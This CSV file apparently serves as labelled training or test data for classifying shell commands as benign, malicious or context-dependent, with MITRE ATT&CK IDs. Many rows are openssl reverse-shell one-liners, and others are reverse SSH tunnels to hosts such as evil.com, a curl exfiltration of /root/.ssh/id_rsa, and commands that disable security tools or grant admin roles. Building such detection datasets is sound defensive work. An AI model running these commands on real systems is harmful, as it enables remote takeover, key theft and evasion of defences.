command,label,original_label,mitre_id
sudo date 093023592021.59,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
ps ax | grep <name> | grep -v grep | ...,Context_Dependent,Malicious,T1057
tldr rabbitmqctl users,Benign,Benign,Benign
dpkg -l | grep -i 'linux-image\|sudo\|docker\|lxc',Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:53 svcuser@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
needrestart,Benign,Benign,Benign
ssh -R 4444:localhost:8888 postgres@172.20.10.8,Context_Dependent,Synthetic,Synthetic
httpie cli plugins install|upgrade|uninstall plugin_name,Benign,Benign,Benign
ssh -L 8080:localhost:9001 svcuser@evil.com,Context_Dependent,Synthetic,Synthetic
"mkisofs -o filename.iso -V ""label_name"" path/to/source_directory",Benign,Benign,Benign
"espeak-ng -s speed -p pitch ""text""",Benign,Benign,Benign
msiexec /uninstall path\to\file,Benign,Benign,Benign
find . -type f -print0 | xargs -0 -n1 echo rm | sh -x,Benign,Benign,Benign
bore [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
repquota -a,Benign,Synthetic,Synthetic
chatgpt [-m|--model] gpt-4,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:9090 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
vgrep search_pattern,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3389,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:1433 deploy@192.168.1.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3389,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9090 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
away [-t|--time] seconds message,Benign,Benign,Benign
ssh -R 8080:localhost:80 support@192.168.1.25,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:1433 backup@files.company.local,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:5432,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:8443 svcuser@malware.site,Context_Dependent,Synthetic,Synthetic
sfdk init [-t|--type] type [-b|--builder] builder,Benign,Benign,Benign
setx variable value,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
"find /home/jul/here -type f \( -iname ""*.php"" -o -iname ""*.js"" \) ! -path ""/home/jul/here/exclude/*""",Context_Dependent,Benign,Benign
zed path/to/file_or_directory1 path/to/file_or_directory2 ...,Benign,Benign,Benign
expac [-S|--sync] '%D' package,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
wl-copy --clear,Benign,Benign,Benign
mplayer path/to/file1 path/to/file2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
rdesktop -u username -p password -a 16 host:port,Benign,Benign,Benign
virsh save domain path/to/state_file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
choco search query --local-only,Benign,Benign,Benign
"paste -d"" "" file1 file2 | paste -d'|' - file3 | sed 's,|, ,g'",Benign,Benign,Benign
systemd-nspawn [-D|--directory] path/to/container_root [-a|--as-pid2],Benign,Benign,Benign
lpr path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
amdgpu_top --smi,Benign,Benign,Benign
timedatectl set-timezone timezone,Benign,Benign,Benign
gdb [-c|--core] path/to/core path/to/executable -iex 'set debuginfod enabled on' -iex 'set pagination off' -ex bt,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:5432,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:3389 root@10.10.10.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:995,Malicious,Synthetic,Synthetic
hexo clean,Benign,Benign,Benign
abbr [-a|--add] abbreviation_name command command_arguments,Benign,Benign,Benign
ppmtoarbtxt path/to/template -hd path/to/tail_template path/to/image.ppm > path/to/output_file.txt,Benign,Benign,Benign
ssh -R 4444:localhost:443 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
npm access revoke scope:team package_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:443 user@10.10.10.25,Context_Dependent,Synthetic,Synthetic
"echo ""* * * * * script"" | crontab -",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
provlaunch.exe LOLBin,Malicious,Malicious,T1218
choice /c AB,Benign,Benign,Benign
ssh app1,Benign,Benign,Benign
dmesg | grep -i memory,Benign,Benign,Benign
[ -e path/to/file_or_directory ],Benign,Benign,Benign
tldr shnsplit,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist,Malicious,Malicious,T1562
pridecat path/to/file --lesbian [--bi|--bisexual],Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
"foreach ($f in $dirsFilter) { if ($root -like ""*$f*"") { $match = $true; break } }",Context_Dependent,Malicious,T1083
xml [val|validate] --help,Benign,Benign,Benign
pluginpath=/path/to/temp-dir/,Malicious,Malicious,T1548
"find -maxdepth 1 -type f -newermt ""Nov 22"" \! -newermt ""Nov 23"" -delete",Benign,Benign,Benign
ssh -R 8080:localhost:5432 root@172.20.10.8,Context_Dependent,Synthetic,Synthetic
/var/log/kern.log,Malicious,Malicious,T1070
ssh -R 8080:localhost:22 deploy@172.16.0.10,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:5432 jenkins@192.168.1.254,Context_Dependent,Synthetic,Synthetic
"find . -name ""*$VERSION*""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
mcookie [-v|--verbose],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:9090,Malicious,Synthetic,Synthetic
sudo bootc switch --transport oci-archive path/to/image.tar.gz,Benign,Benign,Benign
snoop -V -i path/to/file,Benign,Benign,Benign
find . -type f -inum 31467125 -exec mv {} new_name.html \;,Benign,Benign,Benign
sudo btrfs [su|subvolume] [l|list] path/to/mount_point,Benign,Benign,Benign
ssh -R 4444:localhost:995 user@192.168.1.25,Context_Dependent,Synthetic,Synthetic
sdiag [-a|--all] --json|yaml,Benign,Benign,Benign
tldr [-p|--platform] linux fold,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8080,Malicious,Synthetic,Synthetic
cancel,Benign,Benign,Benign
bd sync,Benign,Benign,Benign
lspci -s 00:18.3,Benign,Benign,Benign
"windows\syswow64,",Malicious,Malicious,T1053
zcat biglogfile.gz | split -l500000 --filter='gzip > $FILE.gz',Benign,Benign,Benign
shopt -s nullglob dotglob,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:22 svcuser@192.168.1.100,Context_Dependent,Synthetic,Synthetic
Invoke-DOSfucation,Malicious,Malicious,T1027
cmd.exe /c eventvwr.msc,Malicious,Malicious,T1548
wpm,Benign,Benign,Benign
spctl --add --label rule_name path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:9001 audit@172.16.0.10,Context_Dependent,Synthetic,Synthetic
fish path/to/script.fish,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:445 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:993,Malicious,Synthetic,Synthetic
"reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup""",Context_Dependent,Malicious,T1012
pass otp path/to/pass,Benign,Benign,Benign
pstopnm path/to/file.ps,Benign,Benign,Benign
sudo nixos-rebuild build-vm,Benign,Benign,Benign
pacaur -Rs package,Benign,Benign,Benign
addr2line [-e|--exe] path/to/executable [-f|--functions] [-C|--demangle] address,Benign,Benign,Benign
serverless create,Benign,Benign,Benign
choom [-p|--pid] pid,Benign,Benign,Benign
cat file.txt | fold,Benign,Benign,Benign
ssh -R 8080:localhost:8080 operator@cdn-sync.bad,Context_Dependent,Synthetic,Synthetic
"Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",Context_Dependent,Malicious,T1518
ssh -L 8080:localhost:5432 root@172.16.0.10,Context_Dependent,Synthetic,Synthetic
zsync -q path/to/url.zsync,Benign,Benign,Benign
ps -A|grep mysql,Context_Dependent,Benign,Benign
jwt encode [-A|--alg] HS256 [-S|--secret] 1234567890 'json_string',Benign,Benign,Benign
trust anchor --remove path/to/certificate.crt,Benign,Benign,Benign
pluma,Benign,Benign,Benign
"find . -type f -printf '%p %s\n' | perl -n -a -e '$sum+=$F[1]; print ""$sum\n""' | tail -n 1",Benign,Benign,Benign
pixi task list,Benign,Benign,Benign
VBoxManage cloud --provider=provider_name --profile=profile_name image delete --id=unique_id,Benign,Benign,Benign
ssh -L 8080:localhost:80 postgres@192.168.1.100,Context_Dependent,Synthetic,Synthetic
konsave [-s|--save] profile_name,Benign,Benign,Benign
wakeonlan 01:02:03:04:05:06,Benign,Benign,Benign
"Write-Host "" [-] $username:${password} invalid credentials.`r`n""",Malicious,Malicious,T1110
po4a-updatepo --help-format,Benign,Benign,Benign
who | grep $USER,Context_Dependent,Benign,Benign
irssi [-n|--nick] nickname [-c|--connect] irc.example.com,Benign,Benign,Benign
crane rebase [-h|--help],Benign,Benign,Benign
ssh -L 8080:localhost:993 postgres@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
git fetch,Benign,Benign,Benign
git diff-tree -r commit1 commit2,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
shasum path/to/file1 path/to/file2 ...,Benign,Benign,Benign
"openstack port create --network network_id --fixed-ip subnet=subnet_id,ip-address=192.168.1.50 port_name",Benign,Benign,Benign
jhipster upgrade,Benign,Benign,Benign
sudo tlmgr repository remove path|url|tag,Benign,Benign,Benign
systemctl is-active elasticsearch,Benign,Synthetic,Synthetic
ssh -R 4444:localhost:80 deploy@192.168.1.254,Context_Dependent,Synthetic,Synthetic
"docker buildx du --format ""table .ID .Description""",Benign,Benign,Benign
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",Malicious,Malicious,T1562
openssl s_client -quiet -connect 192.168.0.5:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
find . -type f ! -perm 777,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
find . -type f -mtime -14 > deploy.txt,Benign,Benign,Benign
kubectl get pods -A,Benign,Synthetic,Synthetic
ssh -R 4444:localhost:22 root@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
"Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""$target_user""",Malicious,Malicious,T1098
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9001,Malicious,Synthetic,Synthetic
shred -u $file_to_shred,Malicious,Malicious,T1070
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:445,Malicious,Synthetic,Synthetic
cat file.json | jtbl,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:6379 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
tldr vim,Benign,Benign,Benign
makepkg [-so|--syncdeps --nobuild],Benign,Benign,Benign
ssh -L 8080:localhost:80 root@10.0.0.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8888 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:8443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
gh [ext|extension] [ls|list],Benign,Benign,Benign
ssh -R 8080:localhost:1433 admin@172.16.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
talk username tty3,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
tesseract --help-psm,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:22,Malicious,Synthetic,Synthetic
kubectl cluster-info dump,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
git clean [-f|--force] -- path/to/directory '*.ext',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
dune clean,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9090,Malicious,Synthetic,Synthetic
nsxiv path/to/directory1 path/to/directory2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
shopt -s histverify,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:1433,Malicious,Synthetic,Synthetic
radeontop,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:1433,Malicious,Synthetic,Synthetic
fsck -f /dev/sdX,Benign,Benign,Benign
nb [to|todos] [a|add] title,Benign,Benign,Benign
ooniprobe list,Benign,Benign,Benign
cd $(find . -name config -type d | sed 1q),Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:1433 operator@10.0.0.50,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:110 svcuser@10.0.0.50,Context_Dependent,Synthetic,Synthetic
u3d,Benign,Benign,Benign
"i3-nagbar [-t|--type] warning [-m|--message] ""warning message""",Benign,Benign,Benign
ssh -R 4444:localhost:22 postgres@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
Clear-RecycleBin,Benign,Benign,Benign
spotify_player [-d|--daemon],Benign,Benign,Benign
find / -mount -name 'win*',Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3389,Malicious,Synthetic,Synthetic
cradle package install package version,Benign,Benign,Benign
ls -1 | (for ((x=0;x<N;x++)) ; do read ; done ; head -n1),Benign,Benign,Benign
doggo example.com @https://dns.quad9.net/dns-query,Benign,Benign,Benign
fdupes path/to/directory,Benign,Benign,Benign
find . -type f -exec perl -pi -e 's|xxx|yyy|g' {} ;,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
base64 /root/.ssh/id_rsa | curl -d @- http://10.10.14.5:5555/,Malicious,Synthetic,Synthetic
"find olddir -type d -printf ""newdir/%P\0"" | xargs -0 mkdir -p",Benign,Benign,Benign
find myfile -perm 0644 -print,Benign,Benign,Benign
"openclaw agent [-m|--message] ""Analyze this"" --thinking off|minimal|low|medium|high",Benign,Benign,Benign
v fmt -w path/to/file.v,Benign,Benign,Benign
ar r /path/to/output-file /path/to/input-file,Context_Dependent,Malicious,T1005
xcowsay --think,Benign,Benign,Benign
ssh -R 8080:localhost:110 backup@172.16.0.10,Context_Dependent,Synthetic,Synthetic
"kosmorro [-p|--position] ""48.7996,2.3511"" [-d|--date] ""+2d""",Benign,Benign,Benign
"sport search ""keyword""",Benign,Benign,Benign
VBoxManage startvm vm_name|uuid --password path/to/password_file,Benign,Benign,Benign
ssh -L 8080:localhost:80 svcuser@10.10.10.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
crane mutate [-t|--tag] tag_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:9002,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 root@support.internal,Context_Dependent,Synthetic,Synthetic
live-server --proxy=/:http:localhost:3000,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:5432,Malicious,Synthetic,Synthetic
ssh-keygen -l -f /etc/ssh/ssh_host_ecdsa_key.pub,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:3306 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 admin@example.com,Context_Dependent,Synthetic,Synthetic
mp4decrypt --key key_id_hex:key_hex path/to/input_file.mp4 path/to/output_file.mp4,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3389,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:143 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
nix profile add github:owner/repo/pkg --profile path/to/directory,Benign,Benign,Benign
ssh -R 4444:localhost:6379 deploy@172.20.10.8,Context_Dependent,Synthetic,Synthetic
scriptreplay path/to/timingfile path/to/typescript 0.5,Benign,Benign,Benign
python -m SimpleHTTPServer 8080,Context_Dependent,Synthetic,Synthetic
find var/ -type f -exec chmod 600 {} \;,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:9002,Malicious,Synthetic,Synthetic
pulumi env set environment_name key value,Benign,Benign,Benign
nxc rdp 192.168.178.2 [-u|--username] username [-p|--password] password --screenshot --res 1024x768,Benign,Benign,Benign
smbcacls //server/share path/to/file --user username --workgroup workgroup,Benign,Benign,Benign
docker build .,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:22 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:443,Malicious,Synthetic,Synthetic
bshell --domain domain,Benign,Benign,Benign
comm -1 -2 file1.sorted file2.sorted,Benign,Benign,Benign
systemctl add-wants target unit --user,Benign,Benign,Benign
reflector [-h|--help],Benign,Benign,Benign
sftp -P remote_port remote_user@remote_host,Benign,Benign,Benign
ssh -R 8080:localhost:8080 postgres@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
podman run image:tag command,Benign,Benign,Benign
pamac checkupdates,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:9090 deploy@192.168.1.254,Context_Dependent,Synthetic,Synthetic
exiqgrep -i -f '<email@example.com>' | xargs exim -Mrm,Benign,Benign,Benign
ssh -R 4444:localhost:5432 svcuser@10.20.30.40,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:6379,Malicious,Synthetic,Synthetic
doctl [a|apps] [l|logs] app_id,Benign,Benign,Benign
ssh -R 8080:localhost:8888 backup@172.16.0.25,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:53,Malicious,Synthetic,Synthetic
kubectx,Benign,Benign,Benign
az config get section_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:6379 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
"find $PWD -exec echo -n '""{}"" ' \; | tr '\n' ' '",Benign,Benign,Benign
ssh -L 8080:localhost:5432 root@10.10.10.25,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:445 user@172.16.0.10,Context_Dependent,Synthetic,Synthetic
pdfcrop path/to/input_file.pdf --margins 'left top right bottom' path/to/output_file.pdf,Benign,Benign,Benign
tlmgr restore,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8443,Malicious,Synthetic,Synthetic
"scamper -O warts.gz -o path/to/output.warts -I ""trace -P icmp-paris 2001:db8:dead:beaf::4""",Benign,Benign,Benign
"lighthouse --only-categories=performance,accessibility,best-practices,seo,pwa https://example.com",Benign,Benign,Benign
pg_createsubscriber [-T|--enable-two-phase] [-d|--database] dbname [-D|--pgdata] path/to/data [-P|--publisher-server] connstr,Benign,Benign,Benign
ssh -R 8080:localhost:443 deploy@10.0.0.100,Context_Dependent,Synthetic,Synthetic
screencapture -T seconds path/to/file.png,Benign,Benign,Benign
cmd /u,Benign,Benign,Benign
vela get deployment --org organization --repo repository_name,Benign,Benign,Benign
run-mailcap --action=print path/to/file,Benign,Benign,Benign
ssh -R 4444:localhost:8888 jenkins@10.0.0.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
"grim -g ""$(slurp -w 0)""",Benign,Benign,Benign
C:\Windows\System32\utilman.exe,Malicious,Malicious,T1546
goku --help,Benign,Benign,Benign
"redis-benchmark -h host -p port -t set,lpush -n 100000",Benign,Benign,Benign
chown root /tmp/hello,Malicious,Malicious,T1548
spark new project_name,Benign,Benign,Benign
